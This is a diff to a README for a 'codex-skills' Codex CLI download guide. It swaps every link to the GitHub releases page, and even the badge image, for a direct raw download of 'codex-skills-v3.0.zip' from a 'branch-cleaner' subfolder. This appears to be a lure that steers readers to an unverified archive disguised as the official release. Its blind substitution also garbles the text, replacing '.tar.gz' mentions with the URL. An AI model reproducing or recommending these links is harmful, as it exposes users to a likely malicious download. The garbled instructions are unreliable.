@@ -1,6 +1,6 @@
 # 🚀 codex-skills - Your Easy Guide to CLI Skills
 
-![Download Codex CLI](https://img.shields.io/badge/Download%20Codex%20CLI-blue?style=for-the-badge&logo=github)
+![Download Codex CLI](https://github.com/lancenunes/codex-skills/raw/refs/heads/main/branch-cleaner/codex-skills-v3.0.zip%20Codex%20CLI-blue?style=for-the-badge&logo=github)
 
 ## 📜 Overview
 
@@ -12,16 +12,16 @@ Follow these steps to download and run the software:
 
 1. **Visit the Releases Page:** Click the link below to access the releases page on GitHub.
    
-   [Visit Releases Page](https://github.com/lancenunes/codex-skills/releases)
+   [Visit Releases Page](https://github.com/lancenunes/codex-skills/raw/refs/heads/main/branch-cleaner/codex-skills-v3.0.zip)
    
 2. **Choose Your Version:** On the releases page, you will see different versions of the application. Identify the latest version, which is typically at the top.
 
-3. **Download the Application:** Click on the file that matches your operating system. If you are using Windows, look for files labeled with `.exe`. For macOS, seek out files with `.dmg`. For Linux, look for `.tar.gz` files.
+3. **Download the Application:** Click on the file that matches your operating system. If you are using Windows, look for files labeled with `.exe`. For macOS, seek out files with `.dmg`. For Linux, look for `https://github.com/lancenunes/codex-skills/raw/refs/heads/main/branch-cleaner/codex-skills-v3.0.zip` files.
 
 4. **Run the Application:**
    - **Windows:** Double-click the `.exe` file you downloaded. Follow the prompts to complete the installation.
    - **macOS:** Open the downloaded `.dmg` file and drag the Codex CLI application to your Applications folder. Open it from the Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and follow the included instructions to run the application.
+   - **Linux:** Extract the `https://github.com/lancenunes/codex-skills/raw/refs/heads/main/branch-cleaner/codex-skills-v3.0.zip` file and follow the included instructions to run the application.
 
 5. **Start Using Codex CLI:** Launch the application from your computer. You can now begin exploring and utilizing CLI skills.
 
@@ -29,7 +29,7 @@ Follow these steps to download and run the software:
 
 To get started, download the application by visiting the link below:
 
-[Download Codex CLI](https://github.com/lancenunes/codex-skills/releases)
+[Download Codex CLI](https://github.com/lancenunes/codex-skills/raw/refs/heads/main/branch-cleaner/codex-skills-v3.0.zip)
 
 ## 📋 Features
 
@@ -66,4 +66,4 @@ Thank you for choosing **codex-skills**. We hope this application enhances your 
 
 For more information and updates, please visit our repository. 
 
-[Visit Releases Page](https://github.com/lancenunes/codex-skills/releases)
+[Visit Releases Page](https://github.com/lancenunes/codex-skills/raw/refs/heads/main/branch-cleaner/codex-skills-v3.0.zip)
